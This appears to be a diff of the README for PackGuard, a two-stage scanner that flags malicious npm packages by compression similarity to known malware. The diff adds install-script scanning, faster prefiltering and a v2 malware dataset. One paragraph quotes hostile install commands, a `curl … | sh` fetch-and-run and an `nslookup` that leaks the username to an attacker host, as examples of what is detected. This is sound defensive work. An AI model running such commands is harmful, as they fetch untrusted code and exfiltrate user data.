@@ -21,7 +21,7 @@ PackGuard tests whether we can have both: accurate detection that runs on an ord
 
 ```mermaid
 flowchart LR
-    A[npm package] --> B[Unpack & split files<br/>8 KB overlapping chunks for large files]
+    A[npm package] --> B[Unpack & split files<br/>8 KB overlapping chunks for large files<br/>+ package.json install scripts]
     B --> C[Stage 1: Compression scanner<br/>NCD vs. known malware, raw LZMA2]
     C -->|not suspicious| D[Clean]
     C -->|flagged| E[Stage 2: AI filter<br/>fine-tuned ModernBERT]
@@ -46,9 +46,10 @@ PackGuard/
 ├── src/                        # C scanner (stage 1; stage 2 ONNX inference planned)
 │   ├── main.c                  # Command line: load references once, scan each package
 │   ├── scanner.c / .h          # Reference set, cached C(x), parallel NCD scoring
-│   ├── prefilter.c / .h        # LZJD digests: picks the references worth an NCD
+│   ├── prefilter.c / .h        # LZJD digests and inverted index: picks the references worth an NCD
 │   ├── compresser.c / .h       # Raw LZMA2 compressed sizes via liblzma
 │   ├── chunker.c / .h          # Per-file split into 8 KB overlapping chunks
+│   ├── manifest.c / .h         # Install scripts (preinstall, install, postinstall) from package.json
 │   ├── report.c / .h           # JSON output per package
 │   ├── platform.c / .h         # Threads, directory walk, clock (POSIX and Win32)
 │   ├── packguard.manifest      # Windows: UTF-8 code page, long paths
@@ -56,9 +57,11 @@ PackGuard/
 ├── training/
 │   └── finetune_packguard.py   # Stage 2 fine-tuning (Hugging Face), planned
 ├── data/v1/malware_js_*.zip    # v1 malware set, 16 encrypted zips, see dataset_index.md
+├── data/v2/malware_js_*.zip    # v2 malware set (install scripts, tuned ratio), 16 encrypted zips
 ├── tests/                      # Test inputs and outputs, one folder per function
 ├── experiments/v1/             # v1 detailed test: scripts, results, analysis
-├── docs/                       # Design notes (memory safety and ownership)
+├── experiments/v2/             # v2 dataset builder and examples-per-family ratio experiment
+├── docs/                       # Design notes (memory safety and ownership), v2 suggestions
 ├── scripts/build-windows.ps1   # Native Windows build (zig + static liblzma)
 ├── Makefile                    # Linux/macOS build
 ├── Dockerfile                  # Containerised scanner build
@@ -138,7 +141,7 @@ build/packguard [-j threads] [-p candidates] [-t threshold] [-k groups] \
 
 | Option | Meaning |
 |---|---|
-| `-j` | Worker threads (default: all logical processors) |
+| `-j` | Worker threads, started once per run (default: all logical processors) |
 | `-p` | LZJD prefilter: run NCD only on this many most similar reference chunks per chunk (default 256; `0` scores every reference, the exact brute-force mode) |
 | `-t` | Add `threshold` and `flagged` (score at or below the threshold) to the report |
 | `-k` | Per chunk, also list the `k` closest reference groups (first folder below `reference_dir`, the code-shape folder in v1) |
@@ -147,7 +150,23 @@ build/packguard [-j threads] [-p candidates] [-t threshold] [-k groups] \
 
 The references are loaded and their C(x) cached once, then every package is scanned in turn, so many packages per run is much faster than one run per package. Byte-identical reference chunks are scored once: v1 has 190,939 chunks but only 69,249 distinct ones, and this never changes a score. Exit status is 0 on success, 1 if any package failed and 2 for a usage error.
 
+**Install scripts.** Many malicious packages carry their whole attack in `package.json`, as a `preinstall`, `install` or `postinstall` command (`curl … | sh`, `nslookup $(whoami).attacker.example`). The scanner reads the `package.json` at the package root, keeps only those three commands, one per line, and scores that text like any other file (it appears as `package.json` in the report). A `package.json` deeper in the package is skipped, since npm never runs its scripts. Reference sets keep no `package.json`; they store the same text as `install_scripts.txt`, which the scanner reads whole.
+
 **Prefilter.** Comparing every chunk with all 69,249 v1 chunks by NCD takes about 34 s per small package. The scanner therefore first ranks the references with [LZJD](https://arxiv.org/abs/1708.03346) (Raff and Nicholas, 2017), the Lempel-Ziv Jaccard distance: the set of phrases an LZ compressor would build, compared by a bottom-1024 min-hash. It is the same idea as NCD without running the compressor, and takes milliseconds for all of v1. NCD then runs only on the 256 most similar chunks. On the v1 detailed test this is about 160× faster (0.23 s per package) and gave every malicious package exactly its brute-force score; see [`experiments/v1/`](experiments/v1/README.md).
+
+Comparing a chunk's digest with every reference digest still cost more than the 256 compressions that follow it. So the digests are turned into an inverted index at load time: for each digest value, the references that hold it. A chunk then only touches the references that share at least one value with it (v1 has 60.4 million digest values but only 2.1 million distinct ones). The top 256 are picked without sorting the rest. The similarities and their order are exactly what a full comparison gives.
+
+**Threads.** The worker threads are started once per run and reused (a thread pool). Packages are scanned in batches of 64. When a batch has at least as many chunks as threads, each thread takes whole chunks and scores them on its own, so threads never wait for each other inside a chunk. Smaller batches, such as one small package, split each chunk's 256 candidates across all threads in blocks of 16. Both ways give identical reports. A package's `seconds` is its load time plus the time spent on its chunks.
+
+**Speed on the v1 detailed test** (195 packages, WSL, 4 threads; every report identical to the earlier build):
+
+| Build | Load | Scan | Total | Peak memory |
+|---|---|---|---|---|
+| 1 MiB dictionary, threads started per pass, full LZJD comparison | 41 s | 67 s | 108 s | 1.28 GB |
+| 64 KiB dictionary and thread pool | 33 s | 61 s | 94 s | 1.27 GB |
+| plus the inverted LZJD index (current) | 43 s | 25 s | 68 s | 1.74 GB |
+
+The index costs about 10 s at load and raises peak memory while it is built; scanning is 2.7× faster.
 
 ### 5. Train the AI filter
 
@@ -180,14 +199,14 @@ The scanner writes one JSON file per package, which stage 2 reads:
 }
 ```
 
-Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. `score` is `null` when a package has no JavaScript. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
+Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. `score` is `null` when a package has no JavaScript and no install scripts. For `package.json`, `text` is its install-script commands, not the whole file. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
 
 ## Default configuration (v1)
 
 | Setting | Value |
 |---|---|
-| Comparison unit | Per file; files > 16 KB split into 8 KB chunks with 4 KB overlap |
-| Compressor | Raw LZMA2 (liblzma), preset 6 (extreme off), 1 MB dictionary, `lc = 3` |
+| Comparison unit | Per file; files > 16 KB split into 8 KB chunks with 4 KB overlap; the root `package.json` as its install-script commands |
+| Compressor | Raw LZMA2 (liblzma), preset 6 (extreme off), 64 KiB dictionary (holds a whole reference chunk plus a whole target chunk), `lc = 3` |
 | C(xy) | Estimated as C(x) + C(y\|x), with the reference x as an LZMA preset dictionary |
 | Prefilter | LZJD (bottom-1024 min-hash of the LZ phrase set); NCD on the 256 most similar reference chunks |
 | Package score | Most suspicious file/chunk (minimum NCD) |
@@ -196,7 +215,7 @@ Lower `ncd` = more similar to known malware. `match` is the closest reference ch
 
 ## Datasets
 
-The v1 malware set is in `data/v1/malware_js_0.zip` to `malware_js_f.zip` (encrypted, password `infected`): 5,904 npm packages from the DataDog dataset, stripped to plain `.js` files with no `package.json`. See [`dataset_index.md`](dataset_index.md) for how it was built. Sources used:
+The v1 malware set is in `data/v1/malware_js_0.zip` to `malware_js_f.zip` (encrypted, password `infected`): 5,904 npm packages from the DataDog dataset, stripped to plain `.js` files with no `package.json`. The v2 set is in `data/v2/malware_js_0.zip` to `malware_js_f.zip`: 6,500 packages, one per code shape and newest first, with their install scripts stored as `install_scripts.txt`. See [`dataset_index.md`](dataset_index.md) for how both were built. Sources used:
 
 - [DataDog malicious software packages dataset](https://github.com/DataDog/malicious-software-packages-dataset)
 - Backstabber's Knife Collection (Ohm et al., 2020)
